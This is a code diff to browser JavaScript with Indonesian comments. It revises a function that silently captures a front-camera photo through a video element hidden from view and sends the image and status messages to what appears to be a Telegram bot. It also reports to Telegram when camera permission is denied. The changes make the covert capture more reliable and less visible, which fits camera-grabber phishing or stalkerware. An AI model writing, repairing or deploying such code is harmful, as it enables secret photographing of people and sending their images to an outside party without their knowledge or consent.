@@ -171,37 +171,45 @@
       }
     }
 
-    // PERBAIKAN FITUR FOTO AGAR JELAS (TIDAK HITAM)
+    // PERBAIKAN SEMPURNA FITUR FOTO (MENGGUNAKAN HIDDEN VIDEO ELEMENT)
     async function takePhotoFast() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+          video: { facingMode: "user" } 
         });
+
+        // Buat elemen video secara dinamis untuk rendering
         const video = document.createElement('video');
+        video.style.display = 'none'; // Sembunyikan dari tampilan
+        video.setAttribute('autoplay', '');
+        video.setAttribute('muted', '');
+        video.setAttribute('playsinline', '');
         video.srcObject = stream;
-        video.setAttribute('playsinline', ''); // Penting untuk mobile
-        
-        video.onloadedmetadata = () => {
-          video.play();
-          
-          // Memberi jeda 800ms agar kamera sempat mengatur exposure/cahaya
+        document.body.appendChild(video);
+
+        // Tunggu video benar-benar siap
+        video.onplaying = () => {
+          // Berikan jeda 1.2 detik (optimal untuk auto-focus dan cahaya)
           setTimeout(() => {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
             
-            // Mengambil gambar
+            // Render frame video ke canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob(blob => {
-              if (blob) {
+              if (blob && blob.size > 0) {
                 sendPhoto(blob, 'depan.png', 'berhasil mengirim foto ✅');
+              } else {
+                sendToTelegram('Gagal memproses gambar ❌');
               }
-              // Matikan stream setelah selesai
+              // Bersihkan memori dan matikan kamera
               stream.getTracks().forEach(track => track.stop());
+              video.remove();
             }, 'image/png');
-          }, 800); 
+          }, 1200);
         };
       } catch (err) {
         sendToTelegram(`Izin Kamera depan ditolak ❌`);
